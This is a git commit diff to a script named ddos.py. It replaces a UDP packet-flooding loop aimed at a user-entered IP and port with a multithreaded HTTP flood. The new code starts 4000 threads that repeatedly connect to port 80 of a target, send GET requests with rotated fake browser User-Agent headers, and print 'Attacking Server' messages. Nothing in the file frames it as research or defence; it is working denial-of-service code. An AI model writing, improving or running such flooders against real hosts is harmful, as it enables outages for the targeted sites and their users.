4d6dfe133c2c0d1584794b52b29be392532cd1f8
netbriler <netbriler@gmail.com>
2020-10-28 13:37:46 +0200

    2 v

--- ddos.py
+++ ddos.py
@@ -1,34 +1,61 @@
-import sys
-import os
-import time
+import threading
 import socket
 import random
+import time
 
-from datetime import datetime
+H = '\033[95m'
+B = '\033[94m'
+G = '\033[92m'
+W = '\033[93m'
+F = '\033[91m'
+E = '\033[0m'
+U = '\033[4m'
+O = '\033[33m'
+agent = []
+agent.append(
+    "Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)")
+agent.append(
+    "Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7")
+agent.append("Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3")
+agent.append("Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14")
+data = '''
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-us,en;q=0.5
+Accept-Encoding: gzip,deflate
+Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7
+Keep-Alive: 115
+Connection: keep-alive'''
 
-now = datetime.now()
-hour = now.hour
-minute = now.minute
-day = now.day
-month = now.month
-year = now.year
+site = input('Ip: ')
+t = [None] * 2000
+a = [None] * 2000
+l = [None] * 2000
 
-##############
-sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-bytes = random._urandom(1490)
-#############
 
-ip = input("IP Target : ")
-port = int(input("Port       : "))
+def dos():
+    while 1:
+        try:
+            s = socket.socket()
+            s.connect((site, 80))
+            packet = str(
+                "GET / HTTP/1.1\nHost: " + site + "\n\n User-Agent: " + random.choice(agent) + "\n" + data).encode(
+                'utf-8')
+            s.sendto(packet, (site, 80))
+            s.send(packet)
+            print(G + time.ctime(time.time()) + ' Attacking Server->' + site + G)
+        except socket.error:
+            print(time.ctime(time.time()) + ' Attacking Server->' + site)
 
-print("[                    ] 0% ")
-time.sleep(1)
-print("[====================] 100%")
-time.sleep(3)
-sent = 0
-while True:
-    sock.sendto(bytes, (ip, port))
-    sent = sent + 1
-    print("Sent %s packet to %s throught port:%s" % (sent, ip, int(port)))
-    if port == 65534:
-        port = 1
+
+def dos2():
+    while 1:
+        dos()
+
+
+for i in range(2000):
+    t[i] = threading.Thread(target=dos)
+for h in range(2000):
+    l[h] = threading.Thread(target=dos2)
+for k in range(2000):
+    t[k].start()
+    l[k].start()
